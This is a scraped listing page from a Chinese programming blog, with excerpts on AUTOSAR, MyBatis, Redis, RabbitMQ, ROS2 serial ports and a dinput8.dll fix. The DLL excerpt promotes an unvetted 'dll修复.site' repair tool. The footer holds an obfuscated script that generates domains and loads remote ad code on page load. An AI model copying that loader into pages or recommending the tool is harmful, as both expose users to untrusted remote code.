定义信号：首先需要定义信号，即用于处理器之间通信的数据类型。可以使用AUTOSAR标准中定义的数据类型，也可以自定义数据类型。创建Sender和Receiver：然后需要创建Sender和Receiver，即用于发送和接收信号的软件组件。在TC397芯片上，可以在不同的TriCore处理器上创建Sender和Receiver，实现不同处理器之间的通信。发送信号：Sender可以通过X-Signals提供的接口发送信号。可以指定接收方的ID，也可以广播信号。发送信号时需要填入信号的数据。接收信号：Receiver可以通过X-Signals提供的接口接收信号。可以指定发送方的ID，也可以接收所有信号。接收信号时可以获取信号的数据。处理信号：在接收到信号后，可以对信号进行处理。可以根据信号的数据类型进行不同的处理，也可以将信号转发给其他的软件组件。 TDA4是一种基于Arm Cortex-A处理器的芯片平台，它同样可以采用AUTOSAR架构来实现多核通信，但由于Arm Cortex-A处理器通常是由不同的芯片产生的，因此它们之间的通信速度相对较慢，通常需要使用IPC（Inter-Process Communication）机制来实现组件之间的通信。IPC机制可以通过共享内存、消息队列、管道等方式来实现不同进程之间的通信和同步。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/508ad23e056b1c210d125895d55bc52a/" rel="bookmark">
			mybatis注解@Select中添加判断条件＜script＞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@Select("&lt;script&gt;" + "select a.id, a.emp_name, a.emp_no,b.depart_name sys_org_code,c.post_name,c.post_name as post_mutex " + " from ls_emp_info a left join sys_depart b on a.org_code = b.org_code " + " left join ls_emp_post c on a.emp_no = c.emp_no " + " &lt;where&gt;" + " &lt;if test=\"empInfo.empName != null and empInfo.empName != ''\"&gt; " + " a.emp_name like CONCAT('%',#{empInfo.empName},'%'), " + " &lt;/if&gt;" + " &lt;/where&gt;" + "&lt;/script&gt;") IPage&lt;EmpInfo&gt; getPage(Page&lt;EmpInfo&gt; page, QueryWrapper&lt;EmpInfo&gt; queryWrapper, @Param("empInfo") EmpInfo empInfo); @Select({"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/508ad23e056b1c210d125895d55bc52a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/681d002efe050cf2a53b334ba0d42abf/" rel="bookmark">
			修复dinput8.dll文件的缺失，以及修复dinput8.dll文件时需要注意什么
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		dinput8.dll文件通常在使用大型游戏时容易出现dinput8.dll文件丢失的情况，今天这篇文章将要教大家修复dinput8.dll文件的缺失，同时在修复dinput8.dll文件时需要注意些什么？防止文件在修复的过程中出现其他的错误。
dinput8.dll是DirectInput库中的一个重要组件，它提供了与输入设备（如键盘、鼠标和游戏控制器）的交互所需的功能。当系统中缺少dinput8.dll文件时，可能会导致无法正常使用某些程序或游戏。在这种情况下，用户可以尝试以下解决办法来解决dinput8.dll丢失的问题。
一.修复dinput8.dll文件的缺失 重新安装游戏或程序 当遇到dinput8.dll丢失的问题时，首先应尝试重新安装受影响的程序或游戏。有时候，dinput8.dll文件可能只是由于程序本身损坏或错误安装所致。通过重新安装该程序，可以确保相关的DLL文件被正确地安装到系统中。
使用dll修复工具 接下来的几种办法可能会更加复杂，所以如果懒人可以看到这里，就不需要继续往下看，直接可以就将dll文件进行修复，这个方法需要在浏览器顶部输入：dll修复.site，
DLL修复工具_一键修复所有dll缺失msvcp140.dll丢失的解决方法–电脑修复精灵
将dll修复工具进行下载安装，启动工具点击一键修复即可将文件丢失的问题进行解决。
从系统备份中恢复dinput8.dll文件 如果用户之前创建了系统备份，可以尝试从备份中恢复dinput8.dll文件。可以打开“控制面板”并选择“系统和安全”&gt;“文件历史记录”&gt;“恢复个人文件”来访问系统备份，并找到并恢复dinput8.dll文件。
使用系统文件检查工具 Windows操作系统提供了系统文件检查工具（SFC），它可以检测和修复系统文件的损坏问题。用户可以通过运行命令提示符（CMD）并输入“sfc /scannow”命令来启动系统文件检查工具。该工具会扫描系统文件并自动替换或修复受损的文件，包括dinput8.dll文件。
下载并替换dinput8.dll文件 如果上述方法无效，用户可以尝试从可信赖的DLL文件网站下载并替换dinput8.dll文件。然而，在下载和替换DLL文件之前，用户应该确保选择了可信赖的网站，并核对所下载DLL文件的版本和适用性。将正确的dinput8.dll文件放置到正确的系统目录中，可能有助于解决问题。
更新操作系统：在某些情况下，操作系统的更新可能包含有关dinput8.dll的修复。用户应检查是否有可用的操作系统更新，并及时安装它们，确保系统中的文件和驱动程序得到更新和修复。
二.修复dinput8.dll文件时需要注意什么 在使用上述方法解决dinput8.dll丢失问题时，小伙伴们应注意以下几点：
首先，确保从可信赖的来源下载DLL文件，以避免下载到恶意软件或错误版本的文件。
其次，尽量避免从未经验证或不可靠的网站或第三方资源下载dinput8.dll文件。最好选择官方网站或可信赖的DLL文件网站进行下载，以确保文件的完整性和安全性。
最后，如果上述方法无法解决问题，用户可以尝试与程序或游戏的开发者或技术支持团队联系，寻求进一步的帮助和指导。
总之，当遇到dinput8.dll丢失的问题时，用户可以尝试重新安装程序或游戏，从系统备份中恢复文件，使用系统文件检查工具，下载并替换dinput8.dll文件，或更新操作系统等方法来解决问题。重要的是选择安全可靠的方法，并遵循唯一的下载来源来获取所需的DLL文件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe1c23cdd7925bb7107e0562515e1249/" rel="bookmark">
			google scholar 显示异常流量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 有时候可能会出现下图警告，导致打不开谷歌学术的界面，我们需要修改一下访问网址 在网站后面添加 .pk 或者 .pr ，如下： https://scholar.google.com.pk/ https://scholar.google.com.pr/ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da3b316bc2d832128945923926dfe4e1/" rel="bookmark">
			【RabbitMQ】初识消息队列 MQ，基于 Docker 部署 RabbitMQ，探索 RabbitMQ 基本使用，了解常见的消息类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、初识消息队列 MQ1.1 同步通信1.2 异步通信1.3 MQ 常见框架及其对比 二、初识 RabbitMQ2.1 什么是 RabbitMQ2.2 RabbitMQ 的结构 三、基于 Docker 部署 RabbitMQ四、常见的消息类型五、示例：在 Java 代码中通过 RabbitMQ 发送消息5.1 消息发布者5.2 消息消费者5.3 使用 RabbitMQ 的原生 Java 客户端操作消息队列存的问题 前言 一、初识消息队列 MQ 1.1 同步通信 同步通信是指发起请求后，调用者需要等待服务提供者的响应。
同步通信的例子 使用手机打电话就是一种同步通信，此时我们只能与一个妹子进行通话，但是如果有另外的妹子想要和自己通话，那么就会建立通话失败，想想确实是一件遗憾的事情。
同步通信在程序中的调用问题 比如，微服务间基于 Feign 实现远程调用，而这种调用方式就是一种同步通信，例如下面微服务之间的调用关系图：
通过这个图示，可以很好的展示在微服务中，同步通信存在的弊端：
用户通过手机端调用了支付服务，再目前这个架构中，其他的服务如订单服务、仓储服务、短信服务等等在支付服务中的调用代码都是线性关系，也就是说只有当支付功能完成后还需要调用其他的服务，调用完所有的微服务之后，支付服务才算完成。此时所有的微服务都是一个线性关系，因此用户支付所花费的时间就是所有微服务处理业务的时间总和了，此时带给用户的体验不佳不说，如果是面对高并发的场景，整个系统也很大可能会招架不住。此时由于所有微服务都是线性关系的，如果系统中的一个微服务宕机了，那么整个系统就会崩溃。如果要新增一个需求，即需要新增一个微服务，那么就会修改支付服务的代码，此时系统的耦合度较高。 因此，总体来说，同步调用存在如下问题：
耦合度高： 每次加入新的需求，都要修改原来的代码。性能下降： 调用者需要等待服务提供者响应，如果调用链过长则响应时间等于每次调用的时间之和。资源浪费： 调用链中的每个服务在等待响应过程中，不能释放请求占用的资源，高并发场景下会极度浪费系统资源。级联失败： 如果服务提供者出现问题，所有调用方都会跟着出问题，如同多米诺骨牌一样，迅速导致整个微服务群故障。 但是对于同步通信来说也具有优点：
例如，它的时效性很强，就如电话通信一样，可以实时获取对方的消息。
1.2 异步通信 异步通信是指发起请求后，调用者不需要立即等待服务提供者的响应。
异步通信的例子 例如，通过微信发送信息就是一种一步通信，当收到了消息之后，我们才去看收到的消息。并且同时可以向多个妹子发消息，一个不回就换另一个发，总有一个回消息的。
异步通信的方案——事件驱动模式 异步通信常见实现就是事件驱动模式，即某个消息就绪了，再通知其他服务来处理，如下图所示，微服务的调用就采用了事件驱动的模式：
通过这个图示，可以很好的展示在微服务中，异步通信的优势：
用户通过手机端调用支付服务，支付功能完成后将支付成功的消息发送给Broker，此时反馈给用户的耗时也就是这两步的耗时之后，此时的时间就非常短了，带给用户的体验也更佳。
这里的 Broker代表的是消息中间件。在消息传递中，Broker 是一种常见的模式。消息中间件充当了消息的中心处理单元，它接收来自生产者的消息，将其存储在队列中，并将消息传递给消费者。这种模式有助于实现解耦、异步通信和提高系统的可伸缩性。
当 Broker 收到了支付成功的消息之后，立即向其他的订阅者通知自己收到了支付成功的消息，然后其他的微服务再向 Broker 获取这个消息来完成自己的业务。
此时各种微服务之间的依赖性大大降低了，如果一个微服务宕机了并不会对整个系统造成太大的影响，并且如果想要新增微服务的话也不需要改动其他微服务的代码，降低了耦合度。
另外，Broker 也起到了消息缓存的作用，如果突然产生了大量的消息，可以缓存到 Broker中，而不至于对其他微服务造成过大的压力。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da3b316bc2d832128945923926dfe4e1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db77107067f1afe8c7c638d4ed2501a5/" rel="bookmark">
			华硕B85M-E主板图解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		详细见华硕官网：https://www.asus.com.cn/supportonly/b85m-e%20r2.0/helpdesk_manual/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9428d72e3c5c009370e272bb7217f4d2/" rel="bookmark">
			PCI接口可以接哪些设备？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 常用的PCI接口的扩展卡有： 1、声卡：2、USB2.0扩展卡：3、以太网卡： 1、声卡： 2、USB2.0扩展卡： 3、以太网卡： 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b2eaecbb73810d145ec7783d604daee/" rel="bookmark">
			NoSQL之Redis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 数据库存储的瓶颈 数据量的总大小 一个机器放不下时数据的索引 一个机器的内存放不下时读写混合访问量 一个实例不能承受时 2. NoSQL的特点 NoSQL = Not Only SQL 非关系型数据库没有声明性查询语言、没有预定义的模式键值对存储、列存储、文档存储、图形数据库最终一致性，而非ACID属性非结构化合不可预知的数据CAP定理（强一致性、高可用性、分区容错性），但是我们要做的是三选二。CA-单点集群，满足一致性，高可用性的系统，扩展性会受限，如果RDBMS、Oracle；CP-满足一致性，分区容忍性的系统，通常性能不是很高，如果Redis、Hbase、MongoDB；AP-满足高可用性、分区容忍性的系统，通常可能对一致性要求低一些，如Riak、CouchDB，大多数网站架构；3高(高并发、高可扩和高性能）+3V(海量、多样、实时)BASE解决方案（基本可用、软状态、最终一致性）。 3. NoSQL数据库的四大分类 KV键值对文档型数据库（如bson格式）列存储数据库图关系数据库 4. Redis简介 Remote Dictionary Server 远程字典服务器完全开源免费的，用C语言编写的，遵守BSD协议；是一个高性能的KV分布式内存数据库，基于内存运行；当然还支持list、set、zset、hash等数据结构的存储；支持持久化的NoSQL数据库，也就是说Redis可异步的将内存中的数据保持在磁盘中，重启后可再次加载进行使用。因此被人们称为数据结构服务器；Redis还支持数据的备份，即master-slave模式的数据备份；取最新N个数据的操作，如取最新的10个评论的ID放入Redis的list中；模拟类似于HttpSession这种需要设定过期时间的功能；发布、订阅消息系统；定时器、计数器；下载地址： Redis redis中文官方网站 5.Redis与MemCache比较 6. Redis集群切片方式 7.Redis分布式存储方案 8.Redis数据分片方案 9. Redis缓存与数据库的协作 10. Centos7下安装Redis cd /opt/ ##下载安装包 wget https://download.redis.io/releases/redis-4.0.9.tar.gz tar -zxvf redis-4.0.9.tar.gz ##编译 cd redis-4.0.9 make ##安装 make install 11. Redis的配置 Redis4是单进程的，默认端口号6379默认有16个数据库，初始默认使用0号库select+库号 切换数据库 dbsize 显示当前库的key的个数五大主要数据类型：String、Hash、List、Set、Zset(Sorted set 有序集合，在set基础上加了一个score值)，Redis 命令参考 — Redis 命令参考 ### Redis的redis.conf ## 启动后台进程 daemonize yes ## 设置数据库的个数 databases 16 ## 端口号，默认6379 port 6379 ## 连接超时时间,单位为秒,0表示不超时 timeout 0 ## tcp连接,单位为秒,0表示不进行keepalive检测 tcp-keepalive 300 ## 日志级别,由小到大为debug、verbose、verbose、warning loglevel notice ## 设置最大内存策略, lru是最近最少使用算法, lfu是最近最不常用算法 ## volatile-lru 对设置了过期时间的key使用LRU算法移除 ## allkeys-lru 使用LRU算法移除任何key ## volatile-lfu 对有过期时间的key采用LFU淘汰算法 ## allkeys-lfu 对全部key采用LFU淘汰算法 ## volatile-random 从过期集合中移除随机key ## allkeys-random 删除一个随机的任意key ## volatile-ttl 删除最近过期的key(较小的TTL) ## noeviction 不驱逐任何东西，只是在写操作上返回一个错误 maxmemory-policy volatile-lfu ## 设置RDB保存规则,多少秒以内,多少次,三个规则从上到下匹配 save 900 1 save 300 10 save 60 10000 ## 配置为yes 在后台异步保存时出错，则不会再写入RDB stop-writes-on-bgsave-error yes ## RDB存储快照的文件名称 dbfilename dump.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b2eaecbb73810d145ec7783d604daee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8588876cf49f2bd783492f12b91a46b/" rel="bookmark">
			ROS2-Foxy 串口通讯
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ROS2-Foxy 串口通讯 环境：Ubuntu20.04 + ROS2-Foxy
时间：2023年11月
截至目前，在全网搜了搜关于ROS2-Foxy串口通信的内容，没有找到官方正式的办法，好像也并没有官方的串口包。通过综合参考几个文档，安装一个大佬修改适配的第三方包，成功实现了串口通讯。
一、环境准备 （一）安装ros2-for-serial-driver sudo apt install ros-foxy-serial-driver （二）安装第三方包串口包 GitHub: ZhaoXiangBox/serial: ROS2 foxy serial
1. 下载源码 git clone https://github.com/ZhaoXiangBox/serial.git 2. 编译源码 cd serial mkdir build cd build cmake .. make 3. 安装 sudo make install （三）加载共享库缓存 sudo ldconfig 如果没有安装过第三方开源库，需要将第三方库常用安装路径写入共享库配置文件中：
sudo sh -c "echo '/usr/local/lib' &gt;&gt; /etc/ld.so.conf" sudo ldconfig （四）安装串口调试工具 sudo apt-get install cutecom 二、示例代码 串口操作包的 API 请参考：serial: Serial Library
#include "rclcpp/rclcpp.hpp" #include "serial/serial.h" serial::Serial ser;//数据串口 #define sBUFFERSIZE 1000// send buffer size 串口发送缓存长度 #define rBUFFERSIZE 1000// receive buffer size 串口接收缓存长度 unsigned char s_buffer[sBUFFERSIZE]; //发送缓存 unsigned char r_buffer[rBUFFERSIZE]; //接收缓存 class ExampleNode : public rclcpp::Node { public: // 构造函数,有一个参数为节点名称 ExampleNode(std::string name) : Node(name) { RCLCPP_INFO(this-&gt;get_logger(), "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8588876cf49f2bd783492f12b91a46b/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/65/">«</a>
	<span class="pagination__item pagination__item--current">66/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/67/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>